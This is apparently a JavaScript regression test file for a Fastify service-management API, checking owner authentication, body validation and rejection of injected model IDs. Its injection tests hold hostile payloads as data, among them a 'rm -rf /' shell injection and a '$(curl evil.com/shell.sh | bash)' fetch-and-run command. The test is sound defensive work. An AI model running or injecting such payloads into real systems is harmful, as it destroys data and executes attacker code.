// @ts-check
/**
 * Service Management Security Regression Tests (real routes via app.inject)
 * Validates: owner gate fail-closed, non-owner rejection, toggle body schema
 */
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, describe, test } from 'node:test';
import Fastify from 'fastify';

const tmpDir = mkdtempSync(join(tmpdir(), 'svc-test-'));
process.env.CAT_CAFE_SERVICES_CONFIG = join(tmpDir, 'services.json');

const { servicesRoutes } = await import('../dist/routes/services.js');

const KNOWN_SERVICE_ID = 'whisper-stt';

describe('service management security — real route', () => {
  let app;
  let originalOwnerEnv;

  before(async () => {
    originalOwnerEnv = process.env.DEFAULT_OWNER_USER_ID;
    app = Fastify();
    await app.register(servicesRoutes);
    await app.ready();
  });

  after(async () => {
    if (originalOwnerEnv !== undefined) {
      process.env.DEFAULT_OWNER_USER_ID = originalOwnerEnv;
    } else {
      delete process.env.DEFAULT_OWNER_USER_ID;
    }
    delete process.env.CAT_CAFE_SERVICES_CONFIG;
    rmSync(tmpDir, { recursive: true, force: true });
    await app?.close();
  });

  describe('owner gate — toggle endpoint', () => {
    test('no auth header → 401', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        payload: { enabled: true },
      });
      assert.equal(res.statusCode, 401);
      const body = JSON.parse(res.body);
      assert.ok(body.error.includes('Authentication'));
    });

    test('no DEFAULT_OWNER_USER_ID configured → any authenticated user allowed', async () => {
      delete process.env.DEFAULT_OWNER_USER_ID;
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'some-user' },
        payload: { enabled: true },
      });
      assert.equal(res.statusCode, 200);
    });

    test('non-owner user → 403', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'attacker' },
        payload: { enabled: true },
      });
      assert.equal(res.statusCode, 403);
      const body = JSON.parse(res.body);
      assert.ok(body.error.includes('Only the owner'));
    });

    test('owner user → allowed (2xx)', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: true },
      });
      assert.equal(res.statusCode, 200);
      const body = JSON.parse(res.body);
      assert.equal(body.ok, true);
    });
  });

  describe('toggle body schema validation', () => {
    test('missing enabled field → 400', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { model: 'some-model' },
      });
      assert.equal(res.statusCode, 400);
      const body = JSON.parse(res.body);
      assert.ok(body.error.includes('Invalid body'));
    });

    test('enabled as string → 400', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: 'true' },
      });
      assert.equal(res.statusCode, 400);
    });

    test('null body → 400', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: null,
      });
      assert.equal(res.statusCode, 400);
    });

    test('valid body with model → 200', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: false, model: 'mlx-community/whisper-large-v3-turbo' },
      });
      assert.equal(res.statusCode, 200);
      const body = JSON.parse(res.body);
      assert.equal(body.ok, true);
    });
  });

  describe('GET /api/services/:id/health — read-only', () => {
    test('health probe does not require owner auth', async () => {
      const res = await app.inject({
        method: 'GET',
        url: `/api/services/${KNOWN_SERVICE_ID}/health`,
      });
      // Should return service state (not 403)
      assert.ok([200].includes(res.statusCode));
      const body = JSON.parse(res.body);
      assert.ok('status' in body);
      assert.ok('installed' in body);
    });

    test('unknown service → 404', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/services/nonexistent-service/health',
      });
      assert.equal(res.statusCode, 404);
    });
  });

  describe('model ID injection prevention', () => {
    test('toggle with shell injection in model → 400', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: true, model: "'; rm -rf / #" },
      });
      assert.equal(res.statusCode, 400);
      const body = JSON.parse(res.body);
      assert.ok(body.error.includes('Invalid model ID'));
    });

    test('toggle with python injection in model → 400', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: true, model: "x'); import os; os.system('id" },
      });
      assert.equal(res.statusCode, 400);
    });

    test('install with injection model → 400', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/install`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { model: '$(curl evil.com/shell.sh | bash)' },
      });
      assert.equal(res.statusCode, 400);
      const body = JSON.parse(res.body);
      assert.ok(body.error.includes('Invalid model ID'));
    });

    test('valid HuggingFace repo-id accepted in toggle', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: true, model: 'mlx-community/whisper-large-v3-turbo' },
      });
      assert.equal(res.statusCode, 200);
    });

    test('model with dots and underscores accepted', async () => {
      process.env.DEFAULT_OWNER_USER_ID = 'owner-1';
      const res = await app.inject({
        method: 'POST',
        url: `/api/services/${KNOWN_SERVICE_ID}/toggle`,
        headers: { 'x-cat-cafe-user': 'owner-1' },
        payload: { enabled: true, model: 'mlx-community/Qwen3.5-35B-A3B-4bit' },
      });
      assert.equal(res.statusCode, 200);
    });
  });
});
